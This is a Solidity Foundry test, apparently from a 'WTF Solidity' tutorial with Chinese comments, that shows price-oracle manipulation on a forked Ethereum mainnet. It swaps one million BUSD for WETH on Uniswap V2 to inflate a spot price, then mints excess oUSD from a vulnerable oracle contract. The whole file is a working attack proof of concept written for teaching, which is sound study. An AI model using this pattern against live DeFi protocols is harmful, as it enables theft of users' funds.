// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Oracle.sol";

contract wtfsolidity_safe is Test {
    address private constant alice = address(1);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router router;
    IWETH private weth = IWETH(WETH);
    IBUSD private busd = IBUSD(BUSD);
    string MAINNET_RPC_URL;
    oUSD ousd;

    function setUp() public {
        MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        // fork指定区块
        vm.createSelectFork(MAINNET_RPC_URL,16060405);
        router = IUniswapV2Router(ROUTER);
        ousd = new oUSD();
    }

    //forge test --match-test  testOracleAttack  -vv
    function testOracleAttack() public {
        // 0. 操纵预言机之前的价格
        uint256 priceBefore = ousd.getPrice();
        console.log("1. ETH Price (before attack): %s", priceBefore); 
        
        // 攻击预言机1
        // 1. 给自己账户 1000000 BUSD
        uint busdAmount = 1_000_000 * 10e18;
        deal(BUSD, alice, busdAmount);
        console.log("BUSD balance (before attack): %s", busd.balanceOf(alice)/10e18);
        console.log("WETH balance (before attack): %s", weth.balanceOf(alice)/10e18);
        // 2. 用busd买weth，推高顺时价格
        vm.prank(alice);
        busd.transfer(address(this), busdAmount);
        uint wethAmount = swapBUSDtoWETH(busdAmount, 1);
        console.log("Swap 1,000,000 BUSD to %s WETH", wethAmount/10e18);
        // 操纵预言机之后的价格
        uint256 priceAfter = ousd.getPrice();
        console.log("2. after attack: price: %s", priceAfter); 
        // 3. 铸造oUSD
        ousd.mint{value: 1 ether}();
        console.log("3. minted %s oUSD with 1 ETH", ousd.balanceOf(address(this))/10e18); 
        console.log("BUSD balance (after attack): %s", busd.balanceOf(address(this))/10e18);
        console.log("WETH balance (after attack): %s", weth.balanceOf(address(this))/10e18);
    }

    // Swap BUSD to WETH
    function swapBUSDtoWETH(uint amountIn, uint amountOutMin)
        public
        returns (uint amountOut)
    {   
        busd.approve(address(router), amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = BUSD;
        path[1] = WETH;

        uint[] memory amounts = router.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            msg.sender,
            block.timestamp
        );

        // amounts[0] = BUSD amount, amounts[1] = WETH amount
        return amounts[1];
    }

    // Swap WETH to BUSD
    function swapWETHtoBUSD(uint amountIn, uint amountOutMin)
        public
        returns (uint amountOut)
    {   
        weth.approve(address(router), amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = WETH;
        path[1] = BUSD;

        uint[] memory amounts = router.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            msg.sender,
            block.timestamp
        );

        // amounts[0] = BUSD amount, amounts[1] = WETH amount
        return amounts[1];
    }
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}

interface IBUSD is IERC20 {
    function balanceOf(address account) external view returns (uint);
}

